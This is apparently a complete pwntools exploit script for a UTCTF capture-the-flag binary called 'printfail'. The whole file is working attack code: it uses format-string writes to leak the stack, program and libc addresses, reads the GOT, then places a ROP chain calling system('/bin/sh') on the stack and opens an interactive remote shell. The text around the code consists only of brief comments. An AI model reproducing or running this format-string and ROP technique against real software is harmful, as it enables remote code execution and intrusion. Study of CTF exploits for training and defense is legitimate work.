from pwn import *

elf = context.binary = ELF("build/printfail")

def connect():
    global io
    io = remote("puffer.utctf.live", 4630)

# 1: Find the offset of the "is empty" pointer

is_empty_ptr_offset = 0
for i in range(6, 20):
    connect()
    io.sendline(b" %" + str(i).encode() + b"$hn\nALLOK")
    if b"That was an empty string" in io.recvall():
        is_empty_ptr_offset = i
        break

print("is_empty_ptr_offset", is_empty_ptr_offset)

def hn(offset):
    return b"%" + str(offset).encode() + b"$hn"
def llx(offset):
    return b"%" + str(offset).encode() + b"$llx"
def pad(n):
    return b"%1$" + str(n).encode() + b"d"
dump_many = b" ".join([llx(i) for i in range(1, 64)])

restore_is_empty_ptr = hn(is_empty_ptr_offset)

# 2: Dump the stack
connect()

print(io.recvline())

def get_dump():
    io.sendline(b" " + restore_is_empty_ptr + dump_many)
    res = io.recvuntil(b"\n...That was an empty string").splitlines()[-2].decode().split(" ")
    return [None] + [int(x, 16) for x in res[1:]]

def write_stack(addr_offset, val, code, debug=False):
    if type(code) == str:
        code = code.encode()
    if val == 0:
        if code == b"hhn":
            val = 256
        elif code == b"hn":
            val = 65536
        else:
            raise ValueError("Tried to write a zero, but too big")
    prompt = b" " + restore_is_empty_ptr + pad(val - 1) + b"%" + str(addr_offset).encode() + b"$" + code
    if debug:
        print(prompt)
    io.sendline(prompt)
    io.recvuntil(b"\n...That was an empty string")

base = get_dump()

def guess_stack_offset():
    global base
    for off in range(1, len(base)):
        #print(off, hex(base[off]))
        if base[off] > 0x1000000 and base[off] < 0x1000000000000 and base[off] & (2**32 - 1) != 0:
            try:
                print(off, hex(base[off]))
                orig = base[off] % 65536
                write_stack(off, 1337, "hn")
                mod = get_dump()
                write_stack(off, orig, "hn")
                for i in range(1, len(base)):
                    if mod[i] % 65536 == 1337:
                        print(off, "might point to", i, "which is currently", hex(base[i]))
                        return base[off] - i * context.bytes
            except EOFError:
                # Restart
                connect()
                base = get_dump()
    raise AssertionError("Unable to find stack offset")

stack_offset = guess_stack_offset()

def addr_to_offset(addr):
    return (addr - stack_offset) // context.bytes
def offset_to_addr(off):
    return off * context.bytes + stack_offset

# Both are offsets
ptr_to_mem = None
ptr_to_ptr = None
code_offset = None
code_mask = 0xfffffffff000
possible_code_offsets = set()

for i in range(1, len(base)):
    desc = ""
    if addr_to_offset(base[i]) >= 0 and addr_to_offset(base[i]) < len(base):
        dest = addr_to_offset(base[i])
        desc = "(" + str(dest) + ": " + hex(base[dest]) + ")"
        if base[dest] >= stack_offset and base[i] < stack_offset + len(base) * context.bytes:
            ptr_to_ptr = i
            ptr_to_mem = dest
            # TODO: this will crash later if they differ in more than the two least significant bits.
            # That doesn't always happen though, so just retry.
            if base[dest] // 65536 != base[i] // 65536:
                raise AssertionError("Stack address changed in bits more significant than the lowest 16; please retry")
            print(i, dest)
    if i >= 5 and base[i] > 0x400000 and abs(base[i] - stack_offset) > 0x10000 and base[i] <= 0x1000000000000:
        print("Maybe a program address  v")
        possible_code_offsets.add((base[i] & code_mask) - ((elf.symbols["main"] - elf.address) & code_mask))
    print(i, hex(stack_offset + context.bytes * i), hex(base[i]), desc)

def write_to_close_addr(addr, value, debug=False):
    for i in range(0, len(value), 2):
        if debug:
            print(hex(get_dump()[ptr_to_ptr]))
            print(hex(get_dump()[ptr_to_mem]))
            print(hex(get_dump()[addr_to_offset(addr)]))
        write_stack(ptr_to_ptr, (addr + i) % 65536, "hn")
        write_stack(ptr_to_mem, u16(value[i:i+2]), "hn")

# Clear space for the payload by moving the work addresses
new_ptr_to_mem = 61
new_ptr_to_ptr = 62
write_to_close_addr(offset_to_addr(new_ptr_to_ptr), pack(offset_to_addr(new_ptr_to_mem)))
write_to_close_addr(offset_to_addr(new_ptr_to_mem), pack(offset_to_addr(new_ptr_to_mem)))
ptr_to_mem = new_ptr_to_mem
ptr_to_ptr = new_ptr_to_ptr

print([hex(i) for i in get_dump()[1:]])
print(hex(offset_to_addr(new_ptr_to_ptr)))
print(hex(offset_to_addr(new_ptr_to_mem)))

far_addr_offset = 63

def read_string_from_addr(addr):
    write_to_close_addr(offset_to_addr(far_addr_offset), pack(addr))
    io.sendline(b"read_string_from_addr start" + restore_is_empty_ptr + b"%" + str(far_addr_offset).encode() + b"$sread_string_from_addr end")
    io.recvuntil(b"read_string_from_addr start")
    return io.recvuntil(b"read_string_from_addr end\n", drop=True) + b'\0'

def read_bytes_from_addr(addr, length):
    out = b''
    while len(out) < length:
        out += read_string_from_addr(addr + len(out))
    return out[:length]

found_offset = False
test_str = b"I'll let you make one printf call"
for offset in possible_code_offsets:
    elf.address = offset
    expected_addr = next(elf.search(test_str))
    print("Setting program offset to", hex(offset))
    print(hex(elf.symbols["main"]))
    print(read_string_from_addr(elf.symbols["main"]))
    if read_string_from_addr(expected_addr).startswith(test_str):
        found_offset = True
        break
if not found_offset:
    raise AssertionError("Could not find code address on the stack")

print("Found the GOT")
for k in elf.got:
    print(k, hex(unpack(read_bytes_from_addr(elf.got[k], context.bytes))))

# Now search a libc database for the symbols; the last three hex chars are always the same regardless of ASLR
# Example: https://libc.blukat.me/
# Only certain symbols will work, for example __libc_start_main, puts, printf
# Both libc6_2.31-0ubuntu9.8_amd64 and libc6_2.31-0ubuntu9.9_amd64 match the UTCTF environment
# (It's actually ubuntu9.9, which you can check once you finish logging in)
libc = ELF("libc6_2.31-0ubuntu9.9_amd64.so")
libc.address = unpack(read_bytes_from_addr(elf.got["puts"], context.bytes)) - libc.symbols["puts"]

payload = ROP([elf, libc])
payload.call(payload.find_gadget(["ret"]))  # alignment
payload.call("system", [next(libc.search(b"/bin/sh\0"))])
payload.call("exit", [0])  # be nice
print(payload.dump())

libc_start = libc.functions["__libc_start_main"]
exit_idx = None
for i in range(1, len(base)):
    if base[i] >= libc_start.address and base[i] < libc_start.address + libc_start.size:
        exit_idx = i
        break
print(exit_idx)

print("ROP will go at " + hex(offset_to_addr(exit_idx)))

write_to_close_addr(offset_to_addr(exit_idx), payload.chain())
io.sendline(b"Launching shell")
io.interactive()
